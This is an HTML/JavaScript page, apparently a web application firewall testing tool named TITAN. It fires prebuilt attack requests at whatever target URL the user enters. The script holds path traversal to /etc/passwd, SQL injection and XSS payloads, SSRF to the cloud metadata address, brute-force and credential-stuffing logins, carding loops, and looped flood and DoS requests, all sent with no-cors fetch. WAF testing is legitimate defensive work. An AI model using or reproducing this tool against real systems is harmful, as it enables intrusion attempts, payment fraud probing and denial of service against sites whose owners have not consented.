<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TITAN | Enterprise WAF Tester</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- UI THEME --- */
        :root {
            --bg: #0a0a0a; --sidebar: #111; --border: #333;
            --accent: #00e5ff; --danger: #ff0055; --text: #ddd;
            --font: 'Segoe UI', monospace;
        }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: var(--font); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* HEADER */
        .top-bar { 
            background: #000; border-bottom: 1px solid var(--border); padding: 15px 20px; 
            display: flex; gap: 15px; align-items: center; 
        }
        .logo { font-weight: 900; font-size: 1.2rem; color: #fff; letter-spacing: 1px; }
        .logo span { color: var(--danger); }
        
        #target-url { 
            flex: 1; background: #1a1a1a; border: 1px solid #444; color: #fff; 
            padding: 10px; font-family: monospace; font-size: 1rem; outline: none; border-radius: 4px;
        }
        #target-url:focus { border-color: var(--accent); }

        /* MAIN LAYOUT */
        .workspace { display: flex; flex: 1; overflow: hidden; }
        
        /* ATTACK PANEL */
        .attack-panel { flex: 1; display: flex; border-right: 1px solid var(--border); }
        .col { flex: 1; display: flex; flex-direction: column; border-right: 1px solid var(--border); min-width: 250px; }
        
        .col-header { 
            padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid var(--border); 
            background: #0e0e0e; color: #fff; text-transform: uppercase; font-size: 0.9rem;
        }
        .col-body { flex: 1; overflow-y: auto; padding: 10px; background: #0c0c0c; }

        /* BUTTONS */
        .btn {
            width: 100%; background: #161616; color: #aaa; border: 1px solid #2a2a2a;
            padding: 12px; margin-bottom: 8px; text-align: left; cursor: pointer;
            transition: 0.2s; font-size: 0.8rem; border-radius: 4px; display: flex; justify-content: space-between;
        }
        .btn:hover { background: #222; color: #fff; border-color: var(--accent); }
        .btn small { color: #555; font-size: 0.7rem; }

        /* LOGS */
        .terminal { width: 400px; background: #000; display: flex; flex-direction: column; }
        .term-header { padding: 10px; border-bottom: 1px solid var(--border); font-weight: bold; font-size: 0.8rem; display: flex; justify-content: space-between; }
        .logs { flex: 1; overflow-y: auto; padding: 10px; font-family: 'Courier New', monospace; font-size: 0.75rem; display: flex; flex-direction: column-reverse; }
        
        .log-row { padding: 4px 0; border-bottom: 1px solid #1a1a1a; display: flex; gap: 10px; }
        .l-time { color: #555; min-width: 60px; }
        .l-stat { font-weight: bold; min-width: 50px; }
        .l-url { color: #888; word-break: break-all; }
        
        .s-SENT { color: var(--accent); }
        .s-ERR { color: var(--danger); }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="logo">TITAN<span>SEC</span></div>
        <input type="text" id="target-url" value="https://thlab.online" placeholder="https://example.com">
        <div style="font-size:0.7rem; color:#666;">Target WAF Tester</div>
    </div>

    <div class="workspace">
        <div class="attack-panel">
            <div class="col">
                <div class="col-header" style="border-bottom: 2px solid #00e1ff">OWASP WEB 10</div>
                <div class="col-body" id="list-web"></div>
            </div>
            <div class="col">
                <div class="col-header" style="border-bottom: 2px solid #ff0055">API SECURITY</div>
                <div class="col-body" id="list-api"></div>
            </div>
            <div class="col">
                <div class="col-header" style="border-bottom: 2px solid #ffaa00">BOT THREATS</div>
                <div class="col-body" id="list-bot"></div>
            </div>
        </div>

        <div class="terminal">
            <div class="term-header">
                <span>TRAFFIC LOGS</span>
                <span>SENT: <b id="cnt-sent" style="color:#fff">0</b></span>
            </div>
            <div class="logs" id="console">
                <div style="text-align:center; color:#333; padding-top:20px;">Ready. Select Target & Attack.</div>
            </div>
        </div>
    </div>

<script>
    /* NOT: Aşağıdaki payloadlarda HTML karakterleri özellikle \u003C ve \u003E 
       şeklinde kodlanmıştır. Bu, tarayıcının scripti yanlışlıkla kapatmasını engeller. 
       Kopyala-yapıştır yaparken bu yapı bozulmaz.
    */
    
    const ATTACK_DB = {
        WEB: [
            { id: 'A01', label: 'Broken Access', desc: 'LFI / Traversal', reqs: [
                { u: '/admin', m: 'GET' }, 
                { u: '/../../../../etc/passwd', m: 'GET' } 
            ]},
            { id: 'A02', label: 'Crypto Fail', desc: 'Cleartext Data', reqs: [
                { u: '/api/pay', m: 'POST', b: {cc:'4111222233334444', cvv:'123'} }
            ]},
            { id: 'A03', label: 'Injection (SQL)', desc: 'UNION SELECT', reqs: [
                { u: "/products?id=' OR '1'='1", m: 'GET' },
                { u: "/login", m: 'POST', b: {user: "admin' --", pass: "123"} }
            ]},
            { id: 'A03X', label: 'Injection (XSS)', desc: 'Script Tags', reqs: [
                { u: "/search?q=\u003Cscript\u003Ealert(1)\u003C/script\u003E", m: 'GET' },
                { u: "/contact", m: 'POST', b: {msg: "\u003Cimg src=x onerror=alert(1)\u003E"} }
            ]},
            { id: 'A04', label: 'Insecure Design', desc: 'Logic Abuse', reqs: [
                { u: '/shop/checkout', m: 'POST', b: {coupon: '100_OFF', price: 0} }
            ]},
            { id: 'A05', label: 'Misconfig', desc: 'Default Files', reqs: [
                { u: '/.git/config', m: 'GET' }, { u: '/actuator/env', m: 'GET' }
            ]},
            { id: 'A06', label: 'Vuln. Comp.', desc: 'Old Libs', reqs: [
                { u: '/assets/jquery-1.6.js', m: 'GET' }
            ]},
            { id: 'A07', label: 'Auth Failures', desc: 'Brute Force', loop: 5, reqs: [
                { u: '/login', m: 'POST', b: {u: 'admin', p: 'pass{i}'} }
            ]},
            { id: 'A08', label: 'Integrity Fail', desc: 'Deserialization', reqs: [
                { u: '/api/data', m: 'POST', b: {obj: 'rO0ABXNyABFq...'} }
            ]},
            { id: 'A09', label: 'Logging Fail', desc: 'Log Evasion', reqs: [
                { u: '/api/logs?action=delete', m: 'DELETE' }
            ]},
            { id: 'A10', label: 'SSRF', desc: 'Metadata Scan', reqs: [
                { u: '/proxy?url=http://169.254.169.254/latest', m: 'GET' }
            ]}
        ],
        API: [
            { id: 'API1', label: 'BOLA / IDOR', desc: 'ID Enum', loop: 5, reqs: [
                { u: '/api/users/{i}', m: 'GET' }
            ]},
            { id: 'API2', label: 'Broken Auth', desc: 'No Token', reqs: [
                { u: '/api/admin', m: 'GET', h: {'Authorization': 'None'} }
            ]},
            { id: 'API3', label: 'Mass Assign', desc: 'Privilege Esc.', reqs: [
                { u: '/api/profile', m: 'POST', b: {role: 'ADMIN'} }
            ]},
            { id: 'API4', label: 'Rate Limit', desc: 'HTTP Flood', loop: 20, reqs: [
                { u: '/api/search?q=test&t={r}', m: 'GET' }
            ]},
            { id: 'API5', label: 'BFLA', desc: 'Unauth DELETE', reqs: [
                { u: '/api/users', m: 'DELETE' }
            ]},
            { id: 'API6', label: 'Sensitive Flow', desc: 'Scalping Bot', loop: 5, reqs: [
                { u: '/api/buy', m: 'POST', b: {id:99, qty:100} }
            ]},
            { id: 'API7', label: 'API SSRF', desc: 'Webhook', reqs: [
                { u: '/api/hooks', m: 'POST', b: {url: 'http://localhost:22'} }
            ]},
            { id: 'API8', label: 'Misconfig', desc: 'CORS', reqs: [
                { u: '/api/info', m: 'GET', h: {'Origin': 'http://evil.com'} }
            ]},
            { id: 'API9', label: 'Inventory', desc: 'Zombie API', reqs: [
                { u: '/api/v1/login', m: 'GET' }, { u: '/api/v0/login', m: 'GET' }
            ]},
            { id: 'API10', label: 'Unsafe Cons.', desc: 'Injection', reqs: [
                { u: '/api/xml', m: 'POST', b: {xml: '\u003C!ENTITY xxe...\u003E'} }
            ]}
        ],
        BOT: [
            { id: 'OAT1', label: 'Carding', desc: 'CC Check', loop: 5, reqs: [
                { u: '/pay', m: 'POST', b: {cc: '411111111111{r}'} }
            ]},
            { id: 'OAT2', label: 'Cred Cracking', desc: 'Enum', reqs: [
                { u: '/forgot-pass', m: 'POST', b: {email: 'admin@corp.com'} }
            ]},
            { id: 'OAT3', label: 'Stuffing', desc: 'Leak Login', reqs: [
                { u: '/login', m: 'POST', b: {u: 'leaked', p: '123456'} }
            ]},
            { id: 'OAT4', label: 'Scraping', desc: 'High Velocity', loop: 10, reqs: [
                { u: '/product/{i}', m: 'GET', h: {'User-Agent': 'Scraper/1.0'} }
            ]},
            { id: 'OAT5', label: 'L7 DoS', desc: 'Heavy Load', loop: 30, reqs: [
                { u: '/heavy-resource?t={r}', m: 'GET' }
            ]},
            { id: 'OAT6', label: 'Fake Acct', desc: 'Registration', loop: 5, reqs: [
                { u: '/signup', m: 'POST', b: {email: 'bot{r}@spam.com'} }
            ]}
        ]
    };

    // --- UI OLUŞTURUCU ---
    function init() {
        createButtons('list-web', ATTACK_DB.WEB);
        createButtons('list-api', ATTACK_DB.API);
        createButtons('list-bot', ATTACK_DB.BOT);
    }

    function createButtons(containerId, list) {
        const container = document.getElementById(containerId);
        list.forEach(atk => {
            const btn = document.createElement('div');
            btn.className = 'btn';
            btn.innerHTML = `<span>${atk.id}: ${atk.label}</span> <small>${atk.desc}</small>`;
            btn.onclick = () => runAttack(atk);
            container.appendChild(btn);
        });
    }

    // --- MOTOR (TRAFFIC ENGINE) ---
    let sentCount = 0;
    const rnd = () => Math.floor(Math.random() * 999999);

    async function runAttack(attackObj) {
        // Hedef URL Kontrolü
        let target = document.getElementById('target-url').value.replace(/\/$/, "");
        if(!target.startsWith("http")) { 
            log('SYS', 'ERR', 'URL http:// veya https:// ile başlamalı!'); 
            return; 
        }

        log('INFO', 'START', `Running ${attackObj.label}...`);

        // Döngü var mı? (Loop)
        const loopCount = attackObj.loop || 1;
        const requests = [];

        for(let i=0; i<loopCount; i++) {
            attackObj.reqs.forEach(r => {
                // Placeholderları değiştir ({i}, {r})
                let url = target + r.u.replace('{i}', i).replace('{r}', rnd());
                
                // Body varsa kopyala ve işle
                let body = null;
                if(r.b) {
                    let bStr = JSON.stringify(r.b);
                    bStr = bStr.replace('{i}', i).replace('{r}', rnd());
                    body = JSON.parse(bStr);
                }

                requests.push(fire(url, r.m, body, r.h));
            });
        }

        await Promise.all(requests);
    }

    async function fire(url, method, body, headers={}) {
        sentCount++;
        document.getElementById('cnt-sent').innerText = sentCount;

        const opts = {
            method: method,
            headers: { 'Content-Type': 'application/json', ...headers },
            mode: 'no-cors' // WAF için en kritik ayar. Cevabı bekleme, sadece gönder.
        };
        
        if(body && method !== 'GET') opts.body = JSON.stringify(body);

        log(method, 'SENT', url); // Loga hemen yaz

        try {
            await fetch(url, opts);
            // no-cors olduğu için cevap durumunu tarayıcı gizler.
            // Amaç trafiği WAF'a ulaştırmaktır.
        } catch (e) {
            log(method, 'ERR', e.message);
        }
    }

    function log(method, status, url) {
        const box = document.getElementById('console');
        const row = document.createElement('div');
        row.className = 'log-row';
        
        let sClass = status === 'SENT' ? 's-SENT' : 's-ERR';
        // URL'i kısalt
        const shortUrl = url.length > 40 ? '...' + url.substring(url.length - 40) : url;

        row.innerHTML = `
            <span class="l-time">${new Date().toLocaleTimeString()}</span>
            <span class="l-stat ${sClass}">${status}</span>
            <span class="l-url"><b>${method}</b> ${shortUrl}</span>
        `;
        
        if(box.children.length > 50) box.lastElementChild.remove();
        box.prepend(row);
    }

    // Sayfa yüklendiğinde başlat
    window.onload = init;

</script>
</body>
</html>
